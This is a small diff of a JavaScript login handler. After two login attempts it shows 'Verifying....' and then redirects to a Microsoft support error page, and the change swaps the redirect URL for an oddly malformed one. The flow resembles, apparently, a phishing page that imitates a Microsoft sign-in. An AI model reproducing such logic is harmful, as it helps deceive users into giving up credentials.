@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
         if (countAttempt >= 2) {
             setTimeout(function () {
-                window.location = "https://support.microsoft.com/en-us/error/67447474";
+                window.location = "https://support.microsoft.com/en-us/error/+76W-%";
             }, 2000);
             btnLogin.value = "Verifying....";
             msgFont.innerHTML = "";
